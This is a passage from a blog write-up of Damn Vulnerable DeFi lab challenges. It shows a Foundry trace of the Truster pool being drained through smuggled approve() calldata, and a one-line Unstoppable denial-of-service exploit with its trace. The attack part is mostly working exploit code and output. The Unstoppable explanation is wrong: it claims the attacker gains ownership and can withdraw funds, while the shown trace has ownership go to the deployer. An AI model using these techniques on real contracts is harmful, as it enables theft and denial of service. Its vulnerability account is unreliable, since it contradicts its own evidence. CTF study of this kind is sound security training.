<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">139777</span><span class="pi">]</span> <span class="s">TrusterChallenge::test_truster()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [86541] → new TrusterExploiter@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   ├─ [46555] TrusterLenderPool::flashLoan(0, TrusterExploiter</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">DamnValuableToken</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0x095ea7b3000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000d3c21bcecceda1000000)</span>
    <span class="s">│   │   ├─ [2802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]</span>
    <span class="s">│   │   ├─ [5651] DamnValuableToken::transfer(TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="na">: TrusterLenderPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: TrusterExploiter</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [25079] DamnValuableToken::approve(TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   │   ├─ emit Approval(owner</span><span class="na">: TrusterLenderPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: TrusterExploiter</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   ├─ [802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]</span>
    <span class="s">│   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   ├─ [29354] DamnValuableToken::transferFrom(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], recovery</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   ├─ emit Transfer(from</span><span class="na">: TrusterLenderPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   └─ ← [Return] 21 bytes of code</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">1</span>
    <span class="s">├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [802] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 1000000000000000000000000 [1e24]</span>
    <span class="s">├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 27.70ms (4.16ms CPU time)</span>

</code></pre></div></div>

<hr />

<h1 id="unstoppable-challenge">Unstoppable Challenge</h1>

<h2 id="challenge-overview-6">Challenge Overview</h2>
<p>This challenge involves exploiting a flashloan vulnerability in the UnstoppableVault contract. The vault offers flash loans with a fee and allows the owner to pause the contract and execute arbitrary changes. The goal is to exploit the flashloan mechanism, triggering an unwanted state change.</p>

<h2 id="smart-contract-breakdown-1">Smart Contract Breakdown</h2>

<h3 id="important-state-variables">Important State Variables</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">FEE_FACTOR</code>: The fee for flashloans (5%).</li>
  <li><code class="language-plaintext highlighter-rouge">GRACE_PERIOD</code>: The period after which the flashloan fee changes.</li>
  <li><code class="language-plaintext highlighter-rouge">feeRecipient</code>: The address to which the flashloan fees are sent.</li>
  <li><code class="language-plaintext highlighter-rouge">end</code>: The timestamp that determines the end of the grace period.</li>
</ul>

<h3 id="critical-functions">Critical Functions</h3>
<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">maxFlashLoan</code></strong>: Returns the maximum amount for a flashloan based on the total assets in the vault.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">flashFee</code></strong>: Calculates the fee for the flashloan.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">flashLoan</code></strong>: Executes the flashloan by transferring tokens, calling the borrower’s callback, and ensuring the correct fee is returned.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">execute</code></strong>: Allows the owner to execute arbitrary changes when the contract is paused.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">setPause</code></strong>: Pauses or unpauses the vault.</li>
</ul>

<h3 id="️-potential-vulnerability">⚠️ Potential Vulnerability</h3>
<p>The vault is vulnerable to a <strong>Denial of Service (DoS) attack</strong> via the flashloan function. An attacker can trigger a failure in the <code class="language-plaintext highlighter-rouge">flashLoan</code> function, causing the vault to enter a paused state and preventing further flashloans.</p>

<h2 id="vulnerability-explained-1">Vulnerability Explained</h2>
<p>The vulnerability occurs when the <code class="language-plaintext highlighter-rouge">flashLoan</code> function fails due to an invalid state (e.g., an incorrect balance). If this happens, the vault is paused, and ownership is transferred to the attacker. This results in the vault being stuck in a paused state, rendering the flashloan feature unusable.</p>

<h2 id="exploit-strategy-5">Exploit Strategy</h2>
<ol>
  <li><strong>FlashLoan Attack</strong>: The attacker initiates a flashloan with an invalid amount or token to trigger the revert condition in the <code class="language-plaintext highlighter-rouge">flashLoan</code> function.</li>
  <li><strong>Vault Pause</strong>: Upon failure, the vault enters a paused state, preventing any further flashloans.</li>
  <li><strong>Ownership Transfer</strong>: The attacker gains control of the vault by transferring ownership, allowing them to alter the contract or withdraw funds.</li>
</ol>

<h2 id="exploit-code-solidity-1">Exploit Code (Solidity)</h2>

<pre><code class="language-solidity">function test_unstoppable() public checkSolvedByPlayer {
    // DOS attack by using an external call to the vault to stop the flashloan
    token.transfer(address(vault), 2);
}
</code></pre>
<h3 id="proof-of-exploit-7">Proof of exploit</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Ran 1 test for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_unstoppable() (gas</span><span class="pi">:</span> <span class="s">74607)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">74607</span><span class="pi">]</span> <span class="s">UnstoppableChallenge::test_unstoppable()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [13251] DamnValuableToken::transfer(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 2)</span>
    <span class="s">│   ├─ emit Transfer(from</span><span class="na">: player</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: UnstoppableVault</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::expectEmit()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ emit FlashLoanStatus(success</span><span class="err">:</span> <span class="kc">false</span><span class="s">)</span>
    <span class="s">├─ [33550] UnstoppableMonitor::checkFlashLoan(100000000000000000000 [1e20])</span>
    <span class="s">│   ├─ [593] UnstoppableVault::asset() [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] DamnValuableToken</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   ├─ [9016] UnstoppableVault::flashLoan(UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], DamnValuableToken</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">100000000000000000000 [1e20], 0x)</span>
    <span class="s">│   │   ├─ [802] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000002 [1e24]</span>
    <span class="s">│   │   ├─ [802] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000002 [1e24]</span>
    <span class="s">│   │   └─ ← [Revert] InvalidBalance()</span>
    <span class="s">│   ├─ emit FlashLoanStatus(success</span><span class="err">:</span> <span class="kc">false</span><span class="s">)</span>
    <span class="s">│   ├─ [9287] UnstoppableVault::setPause(true)</span>
    <span class="s">│   │   ├─ emit Paused(account</span><span class="na">: UnstoppableMonitor</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   ├─ [5379] UnstoppableVault::transferOwnership(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])</span>
    <span class="na">│   │   ├─ emit OwnershipTransferred(previousOwner: UnstoppableMonitor</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">newOwner: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [518] UnstoppableVault::paused() [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">├─ [0] VM::assertTrue(true, "Vault is not paused") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [573] UnstoppableVault::owner() [staticcall]</span>
    <span class="s">│   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s2">"</span><span class="s">Vault</span><span class="nv"> </span><span class="s">did</span><span class="nv"> </span><span class="s">not</span><span class="nv"> </span><span class="s">change</span><span class="nv"> </span><span class="s">owner") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 7.19ms (895.44µs CPU time)</span>

<span class="na">Ran 1 test suite in 2.46s (7.19ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>
</code></pre></div></div>

<hr />
<p><strong>*Next Challenge update soon!!</strong></p>


  </div><a class="u-url" href="/writeups/2025/04/30/DamnDefi.html" hidden></a>
</article>

    </main>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Copy button functionality for code blocks
            const preBlocks = document.querySelectorAll('pre');
            preBlocks.forEach(pre => {
                if (pre.parentNode.classList.contains('code-container')) return; // Avoid re-wrapping
                const container = document.createElement('div');
                container.className = 'code-container';
                const copyButton = document.createElement('button');
                copyButton.className = 'copy-button';
                copyButton.textContent = 'Copy';
                pre.parentNode.insertBefore(container, pre);
                container.appendChild(pre);
                container.appendChild(copyButton);
                copyButton.addEventListener('click', () => {
                    const code = pre.querySelector('code').innerText;
                    navigator.clipboard.writeText(code).then(() => {
                        copyButton.textContent = 'Copied!';
                        setTimeout(() => {
                            copyButton.textContent = 'Copy';
                        }, 2000);
                    }).catch(err => {
                        console.error('Failed to copy: ', err);
                    });
                });
            });

            // Mobile menu toggle functionality
            const menuToggle = document.getElementById('menuToggle');
            const mainNav = document.getElementById('mainNav');

            if (menuToggle && mainNav) {
                menuToggle.addEventListener('click', function () {
                    mainNav.classList.toggle('active');
                    menuToggle.classList.toggle('active');
                });

                // Close menu when clicking on a link
                const navLinks = mainNav.querySelectorAll('a');
                navLinks.forEach(link => {
                    link.addEventListener('click', () => {
                        mainNav.classList.remove('active');
                        menuToggle.classList.remove('active');
                    });
                });

                // Close menu when clicking outside
                document.addEventListener('click', function (event) {
                    const isClickInsideNav = mainNav.contains(event.target);
                    const isClickOnToggle = menuToggle.contains(event.target);

                    if (!isClickInsideNav && !isClickOnToggle && mainNav.classList.contains('active')) {
                        mainNav.classList.remove('active');
                        menuToggle.classList.remove('active');
                    }
                });
            }
        });
    </script>
</body>

</html>